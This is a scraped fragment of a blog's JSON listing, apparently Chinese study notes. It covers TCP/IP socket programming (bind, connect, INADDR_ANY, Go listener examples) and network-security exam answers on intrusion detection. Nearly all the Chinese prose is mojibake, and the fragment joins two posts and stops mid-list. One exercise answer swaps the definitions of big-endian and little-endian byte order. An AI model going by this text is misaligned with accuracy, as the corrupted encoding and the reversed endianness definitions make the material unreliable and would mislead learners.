å…¥IPåœ°å€å’Œç«¯å£å·ã€‚\nå®¢æˆ·ç«¯åœ°å€ä¿¡æ¯åˆå§‹åŒ– ä¸Šè¿°ç½‘ç»œåœ°å€ä¿¡æ¯åˆå§‹åŒ–è¿‡ç¨‹ä¸»è¦é’ˆå¯¹æœåŠ¡å™¨ç«¯è€Œéå®¢æˆ·ç«¯ã€‚ç»™å¥—æ¥å­—åˆ†é…IPåœ°å€å’Œç«¯å£å·ä¸»è¦æ˜¯ä¸ºä¸‹é¢è¿™ä»¶äº‹åšå‡†å¤‡:\nâ€œè¯·æŠŠè¿›å…¥IP 211.217.168.13ã€9190ç«¯å£çš„æ•°æ®ä¼ ç»™æˆ‘!â€ åè§‚å®¢æˆ·ç«¯ä¸­è¿æ¥è¯·æ±‚å¦‚ä¸‹:\nâ€œè¯·è¿æ¥åˆ°IP 211.217.168.13ã€9190ç«¯å£!â€ è¯·æ±‚æ–¹æ³•ä¸åŒæ„å‘³ç€è°ƒç”¨çš„å‡½æ•°ä¹Ÿä¸åŒã€‚æœåŠ¡å™¨ç«¯çš„å‡†å¤‡å·¥ä½œé€šè¿‡bindå‡½æ•°å®Œæˆ,è€Œå®¢æˆ·ç«¯åˆ™é€šè¿‡connectå‡½æ•°å®Œæˆã€‚å› æ­¤,å‡½æ•°è°ƒç”¨å‰éœ€å‡†å¤‡çš„åœ°å€å€¼ç±»å‹ä¹Ÿä¸åŒã€‚æœåŠ¡å™¨ç«¯å£°æ˜sockaddr_in ç»“æ„ä½“å˜é‡,å°†å…¶åˆå§‹åŒ–ä¸ºèµ‹å­æœåŠ¡å™¨ç«¯IPå’Œå¥—æ¥å­—çš„ç«¯å£å·,ç„¶åè°ƒç”¨bindå‡½æ•°;è€Œå®¢æˆ·ç«¯åˆ™å£°æ˜sockaddr_inç»“æ„ä½“,å¹¶åˆå§‹åŒ–ä¸ºè¦ä¸ä¹‹è¿æ¥çš„æœåŠ¡å™¨ç«¯å¥—æ¥å­—çš„IPå’Œç«¯å£å·,ç„¶åè°ƒç”¨connectå‡½æ•°ã€‚\nINADDR_ANY ä¸ä¹‹å‰æ–¹å¼æœ€å¤§çš„åŒºåˆ«åœ¨äº,åˆ©ç”¨å¸¸æ•°INADDR_ANYåˆ†é…æœåŠ¡å™¨ç«¯çš„IPåœ°å€ã€‚è‹¥é‡‡ç”¨è¿™ç§æ–¹å¼,åˆ™å¯è‡ªåŠ¨è·å–è¿è¡ŒæœåŠ¡å™¨ç«¯çš„è®¡ç®—æœºIPåœ°å€,ä¸å¿…äº²è‡ªè¾“äººã€‚è€Œä¸”,è‹¥åŒä¸€è®¡ç®—æœºä¸­å·²åˆ†é…å¤šä¸ªIPåœ°å€(å¤šå®¿ä¸»(Multi-homed)è®¡ç®—æœº,ä¸€èˆ¬è·¯ç”±å™¨å±äºè¿™ä¸€ç±»),åˆ™åªè¦ç«¯å£å·ä¸€è‡´, å°±å¯ä»¥ä»ä¸åŒIPåœ°å€æ¥æ”¶æ•°æ®ã€‚å› æ­¤,æœåŠ¡å™¨ç«¯ä¸­ä¼˜å…ˆè€ƒè™‘è¿™ç§æ–¹å¼ã€‚è€Œå®¢æˆ·ç«¯ä¸­é™¤éå¸¦æœ‰ä¸€éƒ¨åˆ†æœåŠ¡å™¨ç«¯åŠŸèƒ½,å¦åˆ™ä¸ä¼šé‡‡ç”¨ã€‚\nåˆå§‹åŒ–æœåŠ¡å™¨ç«¯å¥—æ¥å­—æ—¶åº”åˆ†é…æ‰€å±è®¡ç®—æœºçš„IPåœ°å€,å› ä¸ºåˆå§‹åŒ–æ—¶ä½¿ç”¨çš„IPåœ°å€éå¸¸æ˜ç¡®,é‚£ä¸ºä½•è¿˜è¦è¿›è¡ŒIPåˆå§‹åŒ–å‘¢?å¦‚å‰æ‰€è¿°,åŒä¸€è®¡ç®—æœºä¸­å¯ä»¥åˆ†é…å¤šä¸ªIPåœ°å€, å®é™…IPåœ°å€çš„ä¸ªæ•°ä¸è®¡ç®—æœºä¸­å®‰è£…çš„NICçš„æ•°é‡ç›¸ç­‰ã€‚å³ä½¿æ˜¯æœåŠ¡å™¨ç«¯å¥—æ¥å­—,ä¹Ÿéœ€è¦å†³å®šåº”æ¥æ”¶å“ªä¸ªIPä¼ æ¥çš„(å“ªä¸ªNICä¼ æ¥çš„)æ•°æ®ã€‚å› æ­¤,æœåŠ¡å™¨ç«¯å¥—æ¥å­—åˆå§‹åŒ–è¿‡ç¨‹ä¸­è¦æ±‚IPåœ°å€ä¿¡æ¯ã€‚å¦å¤–,è‹¥åªæœ‰1ä¸ªNIC,åˆ™ç›´æ¥ä½¿ç”¨INADDR_ANYã€‚\nåœ¨ Go ä¸­ï¼Œä½ å¯ä»¥ä½¿ç”¨ç©ºå­—ç¬¦ä¸²Â \u0026quot;\u0026quot;Â ä½œä¸º IP åœ°å€æ¥ä»£è¡¨ INADDR_ANYï¼Œè¿™è¡¨ç¤ºç›‘å¬æ‰€æœ‰çš„ IP åœ°å€ã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„ TCP æœåŠ¡å™¨ç¤ºä¾‹ï¼Œå®ƒç›‘å¬æ‰€æœ‰çš„ IP åœ°å€å’Œä¸€ä¸ªç‰¹å®šçš„ç«¯å£ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 package main import ( \u0026#34;log\u0026#34; \u0026#34;net\u0026#34; ) func main() { listener, err := net.Listen(\u0026#34;tcp\u0026#34;, \u0026#34;:8080\u0026#34;) if err != nil { log.Fatal(err) } defer listener.Close() for { conn, err := listener.Accept() if err != nil { log.Fatal(err) } go handleConnection(conn) } } func handleConnection(conn net.Conn) { // Handle the connection defer conn.Close() } åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œnet.Listen(\u0026quot;tcp\u0026quot;, \u0026quot;:8080\u0026quot;)Â ä¼šç›‘å¬æ‰€æœ‰çš„ IP åœ°å€å’Œç«¯å£ 8080ã€‚å½“æœ‰æ–°çš„è¿æ¥åˆ°æ¥æ—¶ï¼Œlistener.Accept()Â ä¼šè¿”å›ä¸€ä¸ªæ–°çš„Â net.ConnÂ å¯¹è±¡ï¼Œç„¶åä½ å¯ä»¥åœ¨æ–°çš„ goroutine ä¸­å¤„ç†è¿™ä¸ªè¿æ¥ã€‚\nå‘å¥—æ¥å­—åˆ†é…ç½‘ç»œåœ°å€ æ—¢ç„¶å·²è®¨è®ºäº†sockaddr_inç»“æ„ä½“çš„åˆå§‹åŒ–æ–¹æ³•,æ¥ä¸‹æ¥å°±æŠŠåˆå§‹åŒ–çš„åœ°å€ä¿¡æ¯åˆ†é…ç»™å¥—æ¥å­—ã€‚bindå‡½æ•°è´Ÿè´£è¿™é¡¹æ“ä½œã€‚\n1 2 3 4 5 6 #include \u0026lt;sys/socket.h\u0026gt; int bind(int sockfd, struct sockaddr * myaddr, socklen_t addrLen); //æˆåŠŸæ—¶è¿”å›0,å¤±è´¥æ—¶è¿”å›-1ã€‚ //sockfd è¦åˆ†é…åœ°å€ä¿¡æ¯(IPåœ°å€å’Œç«¯å£å·)çš„å¥—æ¥å­—æ–‡ä»¶æè¿°ç¬¦ã€‚ //myaddr å­˜æœ‰åœ°å€ä¿¡æ¯çš„ç»“æ„ä½“å˜é‡åœ°å€å€¼ã€‚ //addrlen ç¬¬äºŒä¸ªç»“æ„ä½“å˜é‡çš„é•¿åº¦ã€‚ åœ¨ Go è¯­è¨€ä¸­ï¼ŒBind å‡½æ•°æ˜¯ syscall åŒ…ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºå°†æœ¬åœ°åè®®åœ°å€ addr ç»‘å®šåˆ°æ–‡ä»¶æè¿°ç¬¦ fdã€‚å‡½æ•°åŸå‹å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 func Bind(fd int, sa Sockaddr) (err error) { ptr, n, err := sa.sockaddr() if err != nil { return err } return bind(fd, ptr, n) } å…¶ä¸­ï¼Œfd æ˜¯é€šè¿‡ Socket å‡½æ•°è·å–çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œaddr æ˜¯ä¸€ä¸ªå®ç°äº† Sockaddr æ¥å£çš„ç½‘ç»œåœ°å€ã€‚\nä¸¤è€…çš„ä¸»è¦åŒºåˆ«åœ¨äºï¼š\nGo çš„ Bind å‡½æ•°ä½¿ç”¨äº†æ¥å£ Sockaddrï¼Œè¿™ä½¿å¾—ä½ å¯ä»¥ä¼ å…¥ä»»ä½•å®ç°äº† Sockaddr æ¥å£çš„ç±»å‹ï¼Œå¦‚ SockaddrInet4ã€SockaddrInet6ã€SockaddrUnix ç­‰ã€‚è€Œ C çš„ bind å‡½æ•°éœ€è¦ä¸€ä¸ªæŒ‡å‘ struct sockaddr çš„æŒ‡é’ˆï¼Œéœ€è¦æ‰‹åŠ¨è¿›è¡Œç±»å‹è½¬æ¢ã€‚\nGo çš„ Bind å‡½æ•°è¿”å›ä¸€ä¸ªé”™è¯¯å€¼ï¼Œä½ å¯ä»¥ç›´æ¥æ£€æŸ¥è¿™ä¸ªé”™è¯¯å€¼æ¥ç¡®å®š Bind å‡½æ•°æ˜¯å¦æˆåŠŸã€‚è€Œ C çš„ bind å‡½æ•°è¿”å›ä¸€ä¸ªæ•´æ•°ï¼Œéœ€è¦æ£€æŸ¥è¿™ä¸ªæ•´æ•°å’Œ errno æ¥ç¡®å®š bind å‡½æ•°æ˜¯å¦æˆåŠŸã€‚\nGo çš„ Bind å‡½æ•°å¤„ç†äº†ä¸€äº›åº•å±‚çš„ç»†èŠ‚ï¼Œå¦‚ç½‘ç»œå­—èŠ‚åºçš„è½¬æ¢ã€‚è€Œåœ¨ C ä¸­ï¼Œéœ€è¦æ‰‹åŠ¨è¿›è¡Œè¿™äº›æ“ä½œã€‚\n1 2 3 4 5 6 7 func bind(s int, addr unsafe.Pointer, addrlen _Socklen) (err error) { _, _, e1 := syscall(abi.FuncPCABI0(libc_bind_trampoline), uintptr(s), uintptr(addr), uintptr(addrlen)) if e1 != 0 { err = errnoErr(e1) } return } åœ¨ Go è¯­è¨€çš„Â syscallÂ åŒ…ä¸­ï¼ŒBindÂ å’ŒÂ bindÂ å‡½æ•°éƒ½æ˜¯ç”¨æ¥å°†æœ¬åœ°åè®®åœ°å€ç»‘å®šåˆ°æ–‡ä»¶æè¿°ç¬¦çš„ã€‚ bindÂ å‡½æ•°æ˜¯ä¸€ä¸ªç§æœ‰çš„å‡½æ•°ï¼Œå®ƒç›´æ¥æ¥å—ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦å’Œä¸€ä¸ªÂ unsafe.PointerÂ ç±»å‹çš„åœ°å€ä½œä¸ºå‚æ•°ï¼Œç„¶åè°ƒç”¨ç³»ç»Ÿè°ƒç”¨Â bindã€‚è¿™ä¸ªå‡½æ•°é€šå¸¸ä¸ä¼šç›´æ¥è¢«ç”¨æˆ·ä»£ç è°ƒç”¨ï¼Œè€Œæ˜¯è¢«Â BindÂ å‡½æ•°è°ƒç”¨ã€‚ bindÂ å‡½æ•°æ˜¯é€šè¿‡Â syscallÂ å‡½æ•°è°ƒç”¨Â libc_bind_trampolineÂ å‡½æ•°æ¥å®ç°çš„ï¼Œè¿™ä¸ªå‡½æ•°æ˜¯ä¸€ä¸ªè·³æ¿å‡½æ•°ï¼Œå®ƒä¼šè·³è½¬åˆ°åŠ¨æ€é“¾æ¥åº“ä¸­çš„Â bindÂ å‡½æ•°ã€‚ æ€»çš„æ¥è¯´ï¼ŒBindÂ å‡½æ•°æä¾›äº†ä¸€ä¸ªæ›´é«˜çº§çš„æ¥å£ï¼Œå®ƒå¤„ç†äº†ç±»å‹è½¬æ¢å’Œé”™è¯¯å¤„ç†ï¼Œè€ŒÂ bindÂ å‡½æ•°æ˜¯ä¸€ä¸ªæ›´åº•å±‚çš„æ¥å£ï¼Œå®ƒç›´æ¥è°ƒç”¨ç³»ç»Ÿè°ƒç”¨ã€‚\n3.5 åŸºäºWindowsçš„å®ç° ç•¥\n3.6 ä¹ é¢˜ IPåœ°å€æ—IPv4å’ŒIPv6æœ‰ä½•åŒºåˆ«?åœ¨ä½•ç§èƒŒæ™¯ä¸‹è¯ç”Ÿäº†IPv6?\nIPv4ä¸IPv6çš„å·®åˆ«ä¸»è¦æ˜¯è¡¨ç¤ºIPåœ°å€æ‰€ç”¨çš„å­—èŠ‚æ•°,ç›®å‰é€šç”¨çš„åœ°å€æ—ä¸ºIPv4ã€‚IPv6æ˜¯ä¸ºäº†åº”å¯¹2010å¹´å‰åIPåœ°å€è€—å°½çš„é—®é¢˜è€Œæå‡ºçš„æ ‡å‡†ã€‚\né€šè¿‡IPv4ç½‘ç»œIDã€ä¸»æœºIDåŠè·¯ç”±å™¨çš„å…³ç³»è¯´æ˜å‘å…¬å¸å±€åŸŸç½‘ä¸­çš„è®¡ç®—æœºä¼ è¾“æ•°æ®çš„è¿‡ç¨‹ã€‚\nç½‘ç»œåœ°å€(ç½‘ç»œID)æ˜¯ä¸ºåŒºåˆ†ç½‘ç»œè€Œè®¾ç½®çš„ä¸€éƒ¨åˆ†IPåœ°å€ã€‚å‡è®¾å‘WWW.SEMI.COMå…¬å¸ä¼ è¾“æ•°æ®,è¯¥å…¬å¸å†…éƒ¨æ„å»ºäº†å±€åŸŸç½‘,æŠŠæ‰€æœ‰è®¡ç®—æœºè¿æ¥èµ·æ¥ã€‚å› æ­¤,é¦–å…ˆåº”å‘SEMI.COMç½‘ç»œä¼ è¾“æ•°æ®,ä¹Ÿå°±æ˜¯è¯´,å¹¶éä¸€å¼€å§‹å°±æµè§ˆæ‰€æœ‰4å­—èŠ‚IPåœ°å€,è¿›è€Œæ‰¾åˆ°ç›®æ ‡ä¸»æœº;è€Œæ˜¯ä»…æµè§ˆ4å­—èŠ‚IPåœ°å€çš„ç½‘ç»œåœ°å€,å…ˆæŠŠæ•°æ®ä¼ åˆ°SEMI.COMçš„ç½‘ç»œã€‚SEMI.COMç½‘ç»œ(æ„æˆç½‘ç»œçš„è·¯ç”±å™¨)æ¥æ”¶åˆ°æ•°æ®å,æµè§ˆä¼ è¾“æ•°æ®çš„ä¸»æœºåœ°å€(ä¸»æœºID)å¹¶å°†æ•°æ®ä¼ ç»™ç›®æ ‡è®¡ç®—æœºã€‚\nå¥—æ¥å­—åœ°å€åˆ†ä¸ºIPåœ°å€å’Œç«¯å£å·ã€‚ä¸ºä»€ä¹ˆéœ€è¦åœ°å€å’Œç«¯å£å·?æˆ–è€…è¯´,é€šè¿‡IPå¯ä»¥åŒºåˆ†å“ªäº›å¯¹è±¡?é€šè¿‡ç«¯å£å·å¯ä»¥åŒºåˆ†å“ªäº›å¯¹è±¡?\nå¥—æ¥å­—åœ°å€åˆ†ä¸ºIPåœ°å€å’Œç«¯å£å·ï¼Œæ˜¯ä¸ºäº†åœ¨ç½‘ç»œä¸­å”¯ä¸€æ ‡è¯†ä¸€ä¸ªé€šä¿¡ç«¯ç‚¹ã€‚IPåœ°å€ç”¨äºåŒºåˆ†ä¸åŒçš„ä¸»æœºï¼Œå³ä¸åŒçš„è®¡ç®—æœºã€‚ç«¯å£å·ç”¨äºåŒºåˆ†åŒä¸€ä¸»æœºä¸Šçš„ä¸åŒè¿›ç¨‹ï¼Œå³ä¸åŒçš„åº”ç”¨ç¨‹åºã€‚\nè¯·è¯´æ˜IPåœ°å€çš„åˆ†ç±»æ–¹æ³•,å¹¶æ®æ­¤è¯´å‡ºä¸‹é¢è¿™äº›IPåœ°å€çš„åˆ†ç±»ã€‚ 214.121.212.102 ï¼ˆCç±»ï¼‰ 120.101.122.89 ï¼ˆAç±»ï¼‰ 129.78.102.211 ï¼ˆBç±»ï¼‰ è®¡ç®—æœºé€šè¿‡è·¯ç”±å™¨æˆ–äº¤æ¢æœºè¿æ¥åˆ°äº’è”ç½‘ã€‚è¯·è¯´å‡ºè·¯ç”±å™¨å’Œäº¤æ¢æœºçš„ä½œç”¨ã€‚\nè‹¥æƒ³æ„å»ºç½‘ç»œ,éœ€è¦ä¸€ç§ç‰©ç†è®¾å¤‡å®Œæˆå¤–ç½‘ä¸æœ¬ç½‘ä¸»æœºä¹‹é—´çš„æ•°æ®äº¤æ¢,è¿™ç§è®¾å¤‡ä¾¿æ˜¯è·¯ç”±å™¨æˆ–äº¤æ¢æœºã€‚\nä»€ä¹ˆæ˜¯çŸ¥åç«¯å£?å…¶èŒƒå›´æ˜¯å¤šå°‘?çŸ¥åç«¯å£ä¸­å…·æœ‰ä»£è¡¨æ€§çš„HTTPå’ŒFTPç«¯å£å·å„æ˜¯å¤šå°‘?\n0-1023æ˜¯çŸ¥åç«¯å£(Well-known PORT),ä¸€èˆ¬åˆ†é…ç»™ç‰¹å®šåº”ç”¨ç¨‹åºã€‚HTTPçš„ç«¯å£å·æ˜¯80ï¼ŒFTPçš„ç«¯å£å·æ˜¯21\nå‘å¥—æ¥å­—åˆ†é…åœ°å€çš„bindå‡½æ•°åŸå‹å¦‚ä¸‹: int bind(int sockfd, struct sockaddr *myaddr,socklen_t addrlen); è€Œè°ƒç”¨æ—¶åˆ™ç”¨bind(serv_sock,(struct sockaddr *)\u0026amp;sery_addr, sizeof (serv_addr)); æ­¤å¤„serv_addrä¸ºsockaddr_inç»“æ„ä½“å˜é‡ã€‚ä¸å‡½æ•°åŸå‹ä¸åŒ,ä¼ å…¥çš„æ˜¯sockaddr_inç»“æ„ä½“å˜é‡,è¯·è¯´æ˜åŸå› ã€‚\nsockaddr_in ç»“æ„ä½“æ˜¯ sockaddr ç»“æ„ä½“çš„ä¸€ç§ç‰¹å®šç±»å‹ï¼Œå› æ­¤å¯ä»¥é€šè¿‡ç±»å‹è½¬æ¢å°†å…¶ä¼ é€’ç»™ bind å‡½æ•°ã€‚è¿™æ˜¯å› ä¸º sockaddr_in ç»“æ„ä½“åŒ…å«äº† sockaddr ç»“æ„ä½“çš„æ‰€æœ‰æˆå‘˜ï¼Œæ‰€ä»¥åœ¨å®é™…è°ƒç”¨ä¸­å¯ä»¥å°† sockaddr_in ç»“æ„ä½“çš„æŒ‡é’ˆè½¬æ¢ä¸º sockaddr ç»“æ„ä½“çš„æŒ‡é’ˆï¼Œä»è€Œç¬¦åˆ bind å‡½æ•°çš„å‚æ•°è¦æ±‚ã€‚\nè¯·è§£é‡Šå¤§ç«¯åºã€å°ç«¯åºã€ç½‘ç»œå­—èŠ‚åº,å¹¶è¯´æ˜ä¸ºä½•éœ€è¦ç½‘ç»œå­—èŠ‚åºã€‚\nå¤§ç«¯åºï¼ˆBig-Endianï¼‰ï¼šæ•°æ®çš„ä½ä½å­—èŠ‚å­˜å‚¨åœ¨å†…å­˜çš„ä½åœ°å€ï¼Œé«˜ä½å­—èŠ‚å­˜å‚¨åœ¨å†…å­˜çš„é«˜åœ°å€ã€‚ å°ç«¯åºï¼ˆLittle-Endianï¼‰ï¼šæ•°æ®çš„é«˜ä½å­—èŠ‚å­˜å‚¨åœ¨å†…å­˜çš„ä½åœ°å€ï¼Œä½ä½å­—èŠ‚å­˜å‚¨åœ¨å†…å­˜çš„é«˜åœ°å€ã€‚ ç½‘ç»œå­—èŠ‚åºï¼ˆNetwork Byte Orderï¼‰ï¼šæ˜¯æŒ‡åœ¨ç½‘ç»œä¼ è¾“ä¸­é‡‡ç”¨çš„å­—èŠ‚åºã€‚ç½‘ç»œå­—èŠ‚åºé‡‡ç”¨å¤§ç«¯åºï¼Œè¿™æ˜¯å› ä¸ºå¤§ç«¯åºä¸äººç±»é˜…è¯»æ•°å­—çš„é¡ºåºä¸€è‡´ï¼Œå› æ­¤æ›´å®¹æ˜“ç†è§£å’Œè¯†åˆ«ã€‚ ç½‘ç»œå­—èŠ‚åºæ˜¯ç½‘ç»œä¼ è¾“çš„æ ‡å‡†ï¼Œå› æ­¤åœ¨ç½‘ç»œä¼ è¾“ä¸­é‡‡ç”¨ç½‘ç»œå­—èŠ‚åºå¯ä»¥ç¡®ä¿æ•°æ®åœ¨ä¸åŒè®¡ç®—æœºä¹‹é—´æ­£ç¡®ä¼ è¾“ã€‚ å¤§ç«¯åºè®¡ç®—æœºå¸Œæœ›æŠŠ4å­—èŠ‚æ•´æ•°å‹æ•°æ®12ä¼ é€’åˆ°å°ç«¯åºè®¡ç®—æœºã€‚è¯·è¯´å‡ºæ•°æ®ä¼ è¾“è¿‡ç¨‹ä¸­å‘ç”Ÿçš„å­—èŠ‚åºå˜æ¢è¿‡ç¨‹ã€‚\næ•°æ® 12 åœ¨ç½‘ç»œä¼ è¾“è¿‡ç¨‹ä¸­çš„å­—èŠ‚åºæ²¡æœ‰å‘ç”Ÿå˜åŒ–ï¼Œä»ç„¶æ˜¯å¤§ç«¯åºã€‚å°ç«¯åºè®¡ç®—æœºåœ¨æ¥æ”¶åˆ°æ•°æ®åï¼Œéœ€è¦å°†æ•°æ®ä¸­çš„é«˜ä½å­—èŠ‚å’Œä½ä½å­—èŠ‚è¿›è¡Œäº¤æ¢ï¼Œä»¥å°†æ•°æ®è½¬æ¢ä¸ºå°ç«¯åºã€‚\nå¤§ç«¯åº ç½‘ç»œå­—èŠ‚åº å°ç«¯åº 0x0000000C 0x0000000C 0x0C000000 æ€æ ·è¡¨ç¤ºå›é€åœ°å€?å…¶å«ä¹‰æ˜¯ä»€ä¹ˆ?å¦‚æœå‘å›é€åœ°å€ä¼ è¾“æ•°æ®å°†å‘ç”Ÿä»€ä¹ˆæƒ…å†µ? å›é€åœ°å€ï¼ˆloopback addressï¼‰æ˜¯æŒ‡æœ¬åœ°ä¸»æœºçš„ IP åœ°å€ã€‚åœ¨ IPv4 ä¸­ï¼Œå›é€åœ°å€ä¸º 127.0.0.1ã€‚ å›é€åœ°å€ç”¨äºæœ¬åœ°ä¸»æœºä¹‹é—´çš„é€šä¿¡ã€‚å¦‚æœå‘å›é€åœ°å€ä¼ è¾“æ•°æ®ï¼Œåˆ™æ•°æ®å°†ä¼šè¢«æœ¬åœ°ä¸»æœºæ¥æ”¶å¹¶å¤„ç†ã€‚ ","date":"2023-11-15T20:09:07+08:00","permalink":"https://anonymity-0.github.io/posts/tcpip%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E7%AC%AC%E4%B8%89%E7%AB%A0%E7%AC%94%E8%AE%B0/","title":"TCPã€IPç½‘ç»œç¼–ç¨‹ç¬¬ä¸‰ç« ç¬”è®°"},{"content":"å¾—åˆ†ï¼š10/10\nç¬¬å…­è®² IDSæœ‰å“ªäº›ä¸»è¦åŠŸèƒ½?\nç½‘ç»œæµé‡çš„è·Ÿè¸ªä¸åˆ†æåŠŸèƒ½ï¼šè·Ÿè¸ªç”¨æˆ·è¿›å‡ºç½‘ç»œçš„æ‰€æœ‰æ´»åŠ¨ï¼Œå®æ—¶æ£€æµ‹å¹¶åˆ†æç”¨æˆ·åœ¨ç³»ç»Ÿä¸­çš„æ´»åŠ¨çŠ¶æ€ï¼›å®æ—¶ç»Ÿè®¡ç½‘ç»œæµé‡ï¼Œæ£€æµ‹æ‹’ç»æœåŠ¡æ”»å‡»ç­‰å¼‚å¸¸è¡Œä¸ºã€‚\nå·²çŸ¥æ”»å‡»ç‰¹å¾çš„è¯†åˆ«åŠŸèƒ½ï¼šè¯†åˆ«ç‰¹å®šç±»å‹çš„æ”»å‡»ï¼Œå¹¶å‘æ§åˆ¶å°æŠ¥è­¦ï¼Œä¸ºç½‘ç»œé˜²æŠ¤æä¾›ä¾æ®ã€‚æ ¹æ®å®šåˆ¶çš„æ¡ä»¶è¿‡æ»¤é‡å¤å‘Šè­¦äº‹ä»¶ï¼Œå‡è½»ä¼ è¾“ä¸å“åº”çš„å‹åŠ›ã€‚\nå¼‚å¸¸è¡Œä¸ºçš„åˆ†æã€ç»Ÿè®¡ä¸å“åº”åŠŸèƒ½ï¼šåˆ†æç³»ç»Ÿçš„å¼‚å¸¸è¡Œä¸ºæ¨¡å¼ï¼Œç»Ÿè®¡å¼‚å¸¸è¡Œä¸ºï¼Œå¹¶å¯¹å¼‚å¸¸è¡Œä¸ºåšå‡ºå“åº”ã€‚\nç‰¹å¾åº“çš„åœ¨çº¿å’Œç¦»çº¿å‡çº§åŠŸèƒ½ï¼šæä¾›å…¥ä¾µæ£€æµ‹è§„åˆ™çš„åœ¨çº¿å’Œç¦»çº¿å‡çº§ï¼Œå®æ—¶æ›´æ–°å…¥ä¾µç‰¹å¾åº“ï¼Œä¸æ–­æé«˜IDSçš„å…¥ä¾µæ£€æµ‹èƒ½åŠ›ã€‚\næ•°æ®æ–‡ä»¶çš„å®Œæ•´æ€§æ£€æŸ¥åŠŸèƒ½ï¼šæ£€æŸ¥å…³é”®æ•°æ®æ–‡ä»¶çš„å®Œæ•´æ€§ï¼Œè¯†åˆ«å¹¶æŠ¥å‘Šæ•°æ®æ–‡ä»¶çš„æ”¹åŠ¨æƒ…å†µã€‚\nè‡ªå®šä¹‰çš„å“åº”åŠŸèƒ½ï¼šå®šåˆ¶å®æ—¶å“åº”ç­–ç•¥ï¼›æ ¹æ®ç”¨æˆ·å®šä¹‰ï¼Œç»è¿‡ç³»ç»Ÿè¿‡æ»¤ï¼Œå¯¹å‘Šè­¦äº‹ä»¶åŠæ—¶å“åº”ã€‚\nç³»ç»Ÿæ¼æ´çš„é¢„æŠ¥è­¦åŠŸèƒ½ï¼šå¯¹æ–°å‘ç°æˆ–æ–°å…¬å¸ƒçš„ç³»ç»Ÿæ¼æ´ç‰¹å¾è¿›è¡Œé¢„æŠ¥è­¦ã€‚\nIDSæ¢æµ‹å™¨é›†ä¸­ç®¡ç†åŠŸèƒ½ï¼šé€šè¿‡æ§åˆ¶å°æ”¶é›†æ¢æµ‹å™¨çš„çŠ¶æ€å’Œå‘Šè­¦ä¿¡æ¯ï¼Œæ§åˆ¶å„ä¸ªæ¢æµ‹å™¨çš„è¡Œä¸ºã€‚\nç®€è¿°è¯¯ç”¨æ£€æµ‹å’Œå¼‚å¸¸æ£€æµ‹ã€‚\nè¯¯ç”¨æ£€æµ‹æŠ€æœ¯åˆç§°åŸºäºçŸ¥è¯†æˆ–ç‰¹å¾çš„æ£€æµ‹æŠ€æœ¯ã€‚å®ƒå‡å®šæ‰€æœ‰å…¥ä¾µè¡Œä¸ºå’Œæ‰‹æ®µ(åŠå…¶å˜ç§)éƒ½èƒ½å¤Ÿè¡¨è¾¾ä¸ºä¸€ç§æ¨¡å¼æˆ–ç‰¹å¾ï¼Œå¹¶å¯¹å·²çŸ¥çš„å…¥ä¾µè¡Œä¸ºå’Œæ‰‹æ®µè¿›è¡Œåˆ†æï¼Œæå–å…¥ä¾µç‰¹å¾ï¼Œæ„å»ºæ”»å‡»æ¨¡å¼æˆ–æ”»å‡»ç­¾åï¼Œé€šè¿‡ç³»ç»Ÿå½“å‰çŠ¶æ€ä¸æ”»å‡»æ¨¡å¼æˆ–æ”»å‡»ç­¾åçš„åŒ¹é…åˆ¤æ–­å…¥ä¾µè¡Œä¸ºã€‚è¯¯ç”¨æ£€æµ‹æ˜¯æœ€æˆç†Ÿã€åº”ç”¨æœ€å¹¿æ³›çš„æŠ€æœ¯ã€‚ å¼‚å¸¸æ£€æµ‹æŠ€æœ¯åˆç§°ä¸ºåŸºäºè¡Œä¸ºçš„å…¥ä¾µæ£€æµ‹æŠ€æœ¯ï¼Œç”¨æ¥æ£€æµ‹ç³»ç»Ÿï¼ˆä¸»æœºæˆ–ç½‘ç»œï¼‰ä¸­çš„å¼‚å¸¸è¡Œä¸ºã€‚ æ€»ç»“NIDSçš„è„†å¼±æ€§ã€‚\næ£€æµ‹çš„å·¥ä½œé‡å¾ˆå¤§ï¼šNIDSéœ€è¦é«˜æ•ˆçš„æ£€æµ‹æ–¹æ³•å’Œå¤§é‡çš„ç³»ç»Ÿèµ„æºã€‚å®¹æ˜“é­å—DoSæ”»å‡»ã€‚ æ£€æµ‹æ–¹æ³•å±€é™æ€§ï¼šç‰¹å¾åŒ¹é…æ–¹æ³•æœ‰å…¶å›ºæœ‰ç¼ºé™·ï¼Œéš¾ä»¥å®Œå…¨æ£€æµ‹å…¥ä¾µè¡Œä¸ºã€‚ ç½‘ç»œåè®®å¤æ‚æ€§ï¼šNIDSéš¾ä»¥ç²¾ç¡®åˆ†æå¤æ‚çš„ç½‘ç»œåè®®ã€‚ ç³»ç»Ÿå®ç°å·®å¼‚ï¼šNIDSéš¾ä»¥å®Œå…¨å…¼å®¹ä¸åŒç³»ç»Ÿçš„å®ç°æ–¹å¼ã€‚ ç®€è¿°ç½‘ç»œå®‰å…¨æ€åŠ¿æ„ŸçŸ¥ç³»ç»Ÿã€‚\nç½‘ç»œå®‰å…¨æ€åŠ¿æ„ŸçŸ¥ç³»ç»Ÿå¯ä»¥çœ‹æˆæ˜¯åŸºäºåˆ†å¸ƒå¼å…¥ä¾µæ£€æµ‹ç³»ç»Ÿçš„ç»¼åˆå®‰å…¨ç›‘æ§ç³»ç»Ÿï¼Œå…·æœ‰å…¥ä¾µæ£€æµ‹ã€å®‰å…¨çŠ¶æ€å¯è§†åŒ–å±•ç¤ºã€å®‰å…¨çŠ¶æ€ç†è§£åŠè¶‹åŠ¿åˆ†æé¢„æµ‹ï¼Œä»¥åŠç½‘ç»œç›‘è§†å’Œç½‘ç»œæ§åˆ¶ç­‰åŠŸèƒ½ã€‚\nç¬¬ä¸ƒè®² ç®€è¿°TCSEC(å—ä¿¡è®¡ç®—æœºç³»ç»Ÿè¯„æµ‹æ ‡å‡†)æ ‡å‡†çš„C2å®‰å…¨çº§4é¡¹å…³é”®åŠŸèƒ½ã€‚\nå®‰å…¨ç™»å½•æœºåˆ¶ 